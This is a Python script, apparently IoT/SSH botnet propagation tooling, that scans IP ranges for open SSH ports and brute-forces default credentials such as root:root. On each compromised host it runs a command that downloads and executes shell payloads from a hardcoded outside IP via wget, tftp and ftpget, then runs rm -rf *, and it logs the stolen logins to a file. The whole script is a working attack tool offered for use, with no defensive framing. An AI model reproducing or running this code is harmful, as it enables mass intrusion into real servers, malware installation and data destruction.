# Voids hacka scanna
# nano /usr/include/bits/typesizes.h -> change 1024 to 99999
# ulimit -n 99999 
# python scan.py 1000 <start-range> <end-range>

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

server_ip = "46.166.185.139"

blacklisted = ["127.0","10.0","192.168"]

passwords = ["admin:1234"]

if sys.argv[4] == "1":
    passwords = ["root:root"]
if sys.argv[4] == "guest":
    passwords = ["guest:guest"]
if sys.argv[4] == "telnet":
    passwords = ["telnet:telnet"]

if len(sys.argv) < 4:
    sys.exit("Usage: python " + sys.argv[0] + " <threads> <start-range> <end-range> <passwords>")

print "\x1b[0;32m _   ___ _   _         _   _                 \x1b[0;36m"
print "\x1b[0;36m| | / (_) | | |       | | | |                \x1b[0;32m"
print "\x1b[0;36m| |/ / _| |_| |_ _   _| |_| | __ ___  __ ____\x1b[0;32m"
print "\x1b[0;32m|    \| | __| __| | | |  _  |/ _` \ \/ /|_  /\x1b[0;36m"
print "\x1b[0;32m| |\  \ | |_| |_| |_| | | | | (_| |>  <  / / \x1b[0;36m"
print "\x1b[0;36m\_| \_/_|\__|\__|\__, \_| |_/\__,_/_/\_\/___|\x1b[0;36m"
print "\x1b[0;36m                  __/ |                      \x1b[0;36m"
print "\x1b[0;36m                 |___/                       \x1b[0;31m"
print "\x1b[0;31m\x1b[0;31m"
print "\x1b[0;31m\x1b[0;31m"

def sshscanner(ip):
    global passwords
    try:
        thisipisbad='no'
        for badip in blacklisted:
            if badip in ip:
                thisipisbad='yes'
        if thisipisbad=='yes':
            sys.exit()
        username='root'
        password="0"
        port = 22
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        data = str(s.recv(1024))
        if "SSH" in data:
            print("\x1b[0;33m[-] SSH Open On -> " + ip + "\x1b[37m")
        elif "ssh" in data:
            print("\x1b[0;33m[-] SSH Open On -> " + ip + "\x1b[37m")
        else:
            sys.exit()
        s.close()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        dobreak=False
        for passwd in passwords:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                ssh.connect(ip, port = port, username=username, password=password, timeout=3)
                break
            except:
                pass
        badserver=True
        stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
        output = stdout.read()
        if "inet addr" in output:
            badserver=False
        websites = [ ]			
        if badserver == False:
                print("\x1b[0;32m[+] crystal im a haxor hehe " + ip + ":" + username + ":" + password + "\x1b[37m")
                ssh.exec_command('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.139/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.139 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.139; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.139 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *')
                vulns = open("vuln.txt", "a").write(username + ":" + password + ":" + ip + "\n")
                time.sleep(12)
                ssh.close()
    except Exception as e:
        pass


if sys.argv[2] == "LUCKY":
    ranges = ["190.13.0.0/190.13.255.255", "190.40.0.0/190.43.255.255", "190.96.0.0/190.97.255.255", "190.232.0.0/190.239.255.255", "190.184.0.0/190.184.255.255", "181.174.0.0/181.174.255.255", "186.183.0.0/186.183.255.255", "59.177.0.0/59.178.255.255", "59.180.0.0/59.180.255.255", "59.182.0.0/59.184.255.255", "181.64.0.0/181.67.255.255", "200.106.0.0/200.106.255.255", "200.121.0.0/200.121.255.255", "201.230.0.0/201.230.255.255", "201.240.0.0/201.240.255.255"]
    randomrange = random.choice(ranges)
    startrng = randomrange.split("/")[0]
    endrng = randomrange.split("/")[1]

if sys.argv[2] != "LUCKY":
    a = int(sys.argv[2].split(".")[0])
    b = int(sys.argv[2].split(".")[1])
    c = int(sys.argv[2].split(".")[2])
    d = int(sys.argv[2].split(".")[3])
else:
    a = int(startrng.split(".")[0])
    b = int(startrng.split(".")[1])
    c = int(startrng.split(".")[2])
    d = int(startrng.split(".")[3])
x = 0

while(True):
    try:

        if sys.argv[2] != "LUCKY":
            endaddr = sys.argv[3]
        else:
            endaddr = endrng
        
        d += 1

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if endaddr == (ipaddr or str(a) + "." + str(b) + "."+str(c)+"."+str(d-1)):
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        if d > 255:
            c += 1
            d = 0

        if c > 255:
            b += 1
            c = 0
        
        if b > 255:
            a += 1
            b = 0

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if ipaddr == endaddr:
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        if x > 500:
            time.sleep(1)
            x = 0
        
        t = threading.Thread(target=sshscanner, args=(ipaddr,))
        t.start()
        
    except Exception as e:
        pass

print "\x1b[37mDone\x1b[37m"

